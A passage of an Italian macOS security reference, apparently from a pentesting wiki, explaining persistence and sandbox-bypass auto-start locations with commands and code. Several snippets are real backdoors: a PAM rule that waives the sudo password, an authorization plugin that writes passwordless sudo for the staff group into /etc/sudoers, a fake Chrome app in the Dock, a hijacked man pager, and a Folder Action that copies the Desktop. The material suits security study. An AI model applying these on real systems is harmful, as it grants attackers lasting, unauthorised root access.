sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Questo creerà un file tra 1 ora:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Controlla la coda dei job usando `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Sopra possiamo vedere due job pianificati. Possiamo stampare i dettagli del job usando `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Se le attività AT non sono abilitate, le attività create non verranno eseguite.

I **file dei job** si trovano in `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Il nome del file contiene la coda, il numero del job e l’ora in cui è programmata l’esecuzione. Prendiamo ad esempio `a0001a019bdcd2`.

- `a` - questa è la coda
- `0001a` - numero del job in esadecimale, `0x1a = 26`
- `019bdcd2` - ora in esadecimale. Rappresenta i minuti trascorsi dall’epoch. `0x019bdcd2` equivale a `26991826` in decimale. Se lo moltiplichiamo per 60 otteniamo `1619509560`, ovvero `GMT: 2021. 27 aprile, martedì 7:46:00`.

Se stampiamo il file del job, scopriamo che contiene le stesse informazioni ottenute usando `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Utile per bypassare sandbox: [✅](https://emojipedia.org/check-mark-button)
- Tuttavia, è necessario poter chiamare `osascript` con argomenti per contattare **`System Events`** e poter configurare Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Dispone di alcune autorizzazioni TCC di base, come Desktop, Documents e Downloads

#### Posizione

- **`/Library/Scripts/Folder Action Scripts`**
- Sono richiesti i privilegi root
- **Trigger**: accesso alla cartella specificata
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: accesso alla cartella specificata

#### Descrizione e sfruttamento

Folder Actions sono script attivati automaticamente dalle modifiche a una cartella, come l’aggiunta o la rimozione di elementi, oppure da altre azioni come l’apertura o il ridimensionamento della finestra della cartella. Queste azioni possono essere utilizzate per diverse attività e possono essere attivate in modi differenti, ad esempio tramite l’interfaccia utente di Finder o i comandi del terminale.<sup>[[17]](#references)[[18]](#references)</sup>

Per configurare Folder Actions, sono disponibili opzioni come:

1. Creare un workflow Folder Action con [Automator](https://support.apple.com/guide/automator/welcome/mac) e installarlo come servizio.
2. Collegare manualmente uno script tramite Folder Actions Setup nel menu contestuale di una cartella.
3. Utilizzare OSAScript per inviare messaggi Apple Event a `System Events.app` e configurare programmaticamente una Folder Action.
- Questo metodo è particolarmente utile per incorporare l’azione nel sistema, offrendo un certo livello di persistenza.

Il seguente script è un esempio di ciò che può essere eseguito da una Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Per rendere lo script precedente utilizzabile da Folder Actions, compilalo usando:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Dopo aver compilato lo script, configura Folder Actions eseguendo lo script riportato di seguito. Questo script abiliterà globalmente Folder Actions e collegherà specificamente lo script compilato in precedenza alla cartella Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Esegui lo script di configurazione con:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Questo è il modo per implementare questa persistenza tramite la GUI:

Questo è lo script che verrà eseguito:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Compilalo con: `osacompile -l JavaScript -o folder.scpt source.js`

Spostalo in:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Quindi, apri l'app `Folder Actions Setup`, seleziona la **cartella che desideri monitorare** e, nel tuo caso, seleziona **`folder.scpt`** (nel mio caso l'ho chiamato output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Ora, se apri quella cartella con **Finder**, il tuo script verrà eseguito.

Questa configurazione è stata memorizzata nel **plist** situato in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in formato base64.

Ora proviamo a preparare questa persistence senza accesso alla GUI:

1. **Copia `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in `/tmp` per crearne un backup:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Rimuovi** le Folder Actions appena configurate:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Ora che abbiamo un ambiente vuoto:

3. Copia il file di backup: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Apri Folder Actions Setup.app per caricare questa configurazione: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> E questo non ha funzionato per me, ma queste sono le istruzioni del writeup:(

### Scorciatoie del Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- È però necessario aver installato un'applicazione malevola all'interno del sistema
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: quando l'utente fa clic sull'app all'interno del Dock

#### Descrizione ed Exploitation

Tutte le applicazioni visualizzate nel Dock sono specificate all'interno del plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

È possibile **aggiungere un'applicazione** semplicemente con:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Usando un po' di **social engineering** potresti **impersonare, ad esempio, Google Chrome** nel dock ed eseguire effettivamente il tuo script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Deve verificarsi un'azione molto specifica
- Finirai in un'altra sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- `/Library/ColorPickers`
- Sono richiesti i privilegi root
- Trigger: usa il color picker
- `~/Library/ColorPickers`
- Trigger: usa il color picker

#### Descrizione ed exploit

**Compila un bundle color picker** con il tuo codice (potresti usare [**questo, ad esempio**](https://github.com/viktorstrate/color-picker-plus)) e aggiungi un constructor (come nella [sezione Screen Saver](macos-auto-start-locations.md#screen-saver)), quindi copia il bundle in `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Quindi, quando viene attivato il color picker, dovrebbe essere eseguito anche il tuo bundle.

Tieni presente che il binario che carica la tua libreria ha una **sandbox molto restrittiva**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Utile per bypassare la sandbox: **No, perché è necessario eseguire una propria app**
- TCC bypass: ???

#### Posizione

- Un'app specifica

#### Descrizione ed exploit

Un esempio di applicazione con una Finder Sync Extension [**è disponibile qui**](https://github.com/D00MFist/InSync).

Le applicazioni possono avere `Finder Sync Extensions`. Questa extension viene inserita all'interno di un'applicazione che verrà eseguita. Inoltre, affinché l'extension possa eseguire il proprio codice, **deve essere firmata** con un certificato Apple developer valido, deve essere **sandboxed** (sebbene sia possibile aggiungere eccezioni meno restrittive) e deve essere registrata con qualcosa come:<sup>[[21]](#references)[[22]](#references)</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Salvaschermo

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Tuttavia finirai in una sandbox di un'applicazione comune
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- `/System/Library/Screen Savers`
- Root required
- **Trigger**: selezionare il salvaschermo
- `/Library/Screen Savers`
- Root required
- **Trigger**: selezionare il salvaschermo
- `~/Library/Screen Savers`
- **Trigger**: selezionare il salvaschermo

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Descrizione ed exploit

Crea un nuovo progetto in Xcode e seleziona il template per generare un nuovo **Screen Saver**. Quindi aggiungi il tuo codice, ad esempio il seguente codice per generare logs.<sup>[[23]](#references)[[24]](#references)</sup>

Esegui il **Build** e copia il bundle `.saver` in **`~/Library/Screen Savers`**. Quindi apri la GUI del salvaschermo e, se fai semplicemente clic su di esso, dovrebbe generare molti logs:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Nota che, poiché all'interno degli entitlements del binario che carica questo codice (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) puoi trovare **`com.apple.security.app-sandbox`**, ti troverai **all'interno del sandbox comune dell'applicazione**.

Codice del Saver:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Plugin di Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Tuttavia, finirai in una application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- La sandbox sembra molto limitata

#### Posizione

- `~/Library/Spotlight/`
- **Trigger**: viene creato un nuovo file con un'estensione gestita dal plugin di Spotlight.
- `/Library/Spotlight/`
- **Trigger**: viene creato un nuovo file con un'estensione gestita dal plugin di Spotlight.
- Sono richiesti i privilegi di root
- `/System/Library/Spotlight/`
- **Trigger**: viene creato un nuovo file con un'estensione gestita dal plugin di Spotlight.
- Sono richiesti i privilegi di root
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: viene creato un nuovo file con un'estensione gestita dal plugin di Spotlight.
- È richiesta una nuova app

#### Descrizione & Exploitation

Spotlight è la funzionalità di ricerca integrata di macOS, progettata per fornire agli utenti **accesso rapido e completo ai dati presenti sui loro computer**.\
Per facilitare questa capacità di ricerca rapida, Spotlight mantiene un **database proprietario** e crea un indice **analizzando la maggior parte dei file**, consentendo ricerche veloci sia nei nomi dei file sia nel loro contenuto.<sup>[[25]](#references)</sup>

Il meccanismo sottostante di Spotlight coinvolge un processo centrale denominato 'mds', che sta per **'metadata server'.** Questo processo coordina l'intero servizio Spotlight. A questo si aggiungono diversi demoni 'mdworker' che eseguono varie attività di manutenzione, come l'indicizzazione di diversi tipi di file (`ps -ef | grep mdworker`). Queste attività sono rese possibili dai plugin Spotlight importer, ovvero i **".mdimporter bundles**", che consentono a Spotlight di comprendere e indicizzare il contenuto di un'ampia gamma di formati di file.

I plugin, o bundle **`.mdimporter`**, si trovano nelle posizioni menzionate in precedenza e, quando compare un nuovo bundle, questo viene caricato entro un minuto (non è necessario riavviare alcun servizio). Questi bundle devono indicare quali **tipi di file ed estensioni sono in grado di gestire**; in questo modo, Spotlight li utilizzerà quando viene creato un nuovo file con l'estensione indicata.

È possibile **trovare tutti gli `mdimporters`** caricati eseguendo:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
E, ad esempio, **/Library/Spotlight/iBooksAuthor.mdimporter** viene utilizzato per analizzare questi tipi di file (tra cui le estensioni `.iba` e `.book`):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Se controlli il Plist di altri `mdimporter`, potresti non trovare la voce **`UTTypeConformsTo`**. Questo perché si tratta di un _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) integrato e non è necessario specificare le estensioni.
>
> Inoltre, i plugin predefiniti del sistema hanno sempre la precedenza, quindi un attaccante può accedere solo ai file che non vengono indicizzati dagli `mdimporter` di Apple.
>
> Per creare il tuo importer puoi iniziare con questo progetto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), quindi modificare il nome, **`CFBundleDocumentTypes`** e aggiungere **`UTImportedTypeDeclarations`** in modo che supporti l'estensione desiderata, riflettendo poi le modifiche in **`schema.xml`**.\
> Quindi **modifica** il codice della funzione **`GetMetadataForFile`** per eseguire il tuo payload quando viene creato un file con l'estensione elaborata.
>
> Infine, **compila e copia il tuo nuovo `.mdimporter`** in una delle tre posizioni precedenti. Puoi verificare se è stato caricato **monitorando i log** o eseguendo **`mdimport -L`**.
>
> ### ~~Riquadro delle preferenze~~
>
> > [!CAUTION]
> > Non sembra che funzioni più.
>
> Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>
>
> - Utile per il sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
> - Richiede un'azione specifica dell'utente
> - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
>
> #### Posizione
>
> - **`/System/Library/PreferencePanes`**
> - **`/Library/PreferencePanes`**
> - **`~/Library/PreferencePanes`**
>
> #### Descrizione
>
> Non sembra che funzioni più.<sup>[[26]](#references)</sup>
>
> ## Bypass della sandbox root
>
> > [!TIP]
> > Qui puoi trovare posizioni di avvio utili per il **sandbox bypass**, che consentono di eseguire semplicemente qualcosa **scrivendolo in un file** essendo **root** e/o richiedendo altre **condizioni insolite.**
>
> ### Periodic
>
> Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>
>
> - Utile per il sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
> - È però necessario essere root
> - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
>
> #### Posizione
>
> - `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
> - È richiesto root
> - **Trigger**: Quando arriva il momento
> - `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local`
> - È richiesto root
> - **Trigger**: Quando arriva il momento
>
> #### Descrizione ed Exploitation
>
> Gli script periodic (**`/etc/periodic`**) vengono eseguiti a causa dei **launch daemons** configurati in `/System/Library/LaunchDaemons/com.apple.periodic*`. Nota che gli script archiviati in `/etc/periodic/` vengono **eseguiti** come **proprietario del file,** quindi questo non funzionerà per un potenziale privilege escalation.<sup>[[27]](#references)</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Esistono altri script periodici che verranno eseguiti, indicati in **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Se riesci a scrivere uno qualsiasi dei file `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local`, verrà **eseguito prima o poi**.

> [!WARNING]
> Nota che lo script periodic verrà **eseguito come proprietario dello script**. Quindi, se lo script appartiene a un utente normale, verrà eseguito da quell'utente (questo potrebbe impedire attacchi di privilege escalation).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma devi essere root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- Root sempre richiesto

#### Descrizione ed Exploitation

Poiché PAM è più focalizzato sulla **persistence** e sul malware che sulla facile esecuzione all'interno di macOS, questo blog non fornirà una spiegazione dettagliata, **leggi le writeup per comprendere meglio questa tecnica**.<sup>[[28]](#references)</sup>

Controlla i moduli PAM con:
```bash
ls -l /etc/pam.d
```
Una tecnica di persistence/privilege escalation che abusa di PAM è semplice quanto modificare il modulo `/etc/pam.d/sudo`, aggiungendo all'inizio la riga:
```bash
auth       sufficient     pam_permit.so
```
Quindi **avrà l'aspetto** di qualcosa del genere:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
E quindi qualsiasi tentativo di usare **`sudo` funzionerà**.

> [!CAUTION]
> Nota che questa directory è protetta da TCC, quindi è molto probabile che all'utente venga mostrata una richiesta di accesso.

Un altro esempio interessante è `su`, dove puoi vedere che è anche possibile passare parametri ai moduli PAM (e potresti anche inserire una backdoor in questo file):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Plugin di autorizzazione

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Utile per bypassare sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- È però necessario essere root e creare configurazioni aggiuntive
- TCC bypass: ???

#### Posizione

- `/Library/Security/SecurityAgentPlugins/`
- È necessario root
- È inoltre necessario configurare il database delle autorizzazioni affinché utilizzi il plugin

#### Descrizione ed exploitation

È possibile creare un plugin di autorizzazione che verrà eseguito quando un utente effettua il login per mantenere la persistence. Per ulteriori informazioni su come creare uno di questi plugin, consulta i writeup precedenti (e fai attenzione: un plugin scritto male può impedirti di accedere al sistema e dovrai ripulire il Mac dalla modalità di recovery).<sup>[[29]](#references)[[30]](#references)</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Sposta** il bundle nella posizione da cui verrà caricato:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Infine aggiungi la **regola** per caricare questo Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Il **`evaluate-mechanisms`** indicherà al framework di autorizzazione che dovrà **chiamare un meccanismo esterno per l'autorizzazione**. Inoltre, **`privileged`** farà sì che venga eseguito da root.

Attivalo con:
```bash
security authorize com.asdf.asdf
```
E quindi il **gruppo staff dovrebbe avere accesso sudo** (leggi `/etc/sudoers` per confermare).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma devi essere root e l'utente deve usare man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`/private/etc/man.conf`**
- Root richiesto
- **`/private/etc/man.conf`**: ogni volta che viene usato man

#### Descrizione ed Exploit

Il file di configurazione **`/private/etc/man.conf`** indica il binary/script da usare quando vengono aperti i file della documentazione di man. Quindi il percorso dell'eseguibile potrebbe essere modificato in modo che, ogni volta che l'utente usa man per leggere della documentazione, venga eseguita una backdoor.<sup>[[31]](#references)</sup>

Ad esempio, imposta in **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
E poi crea `/tmp/view` come:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Tuttavia, devi essere root e apache deve essere in esecuzione
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd non dispone di entitlements

#### Posizione

- **`/etc/apache2/httpd.conf`**
- È richiesto root
- Trigger: quando Apache2 viene avviato

#### Descrizione ed Exploit

Puoi indicare in `/etc/apache2/httpd.conf` di caricare un modulo aggiungendo una riga come questa:<sup>[[32]](#references)</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
In questo modo il tuo modulo compilato verrà caricato da Apache. L'unica cosa è che devi **firmarlo con un certificato Apple valido** oppure **aggiungere un nuovo certificato attendibile** al sistema e **firmarlo** con esso.

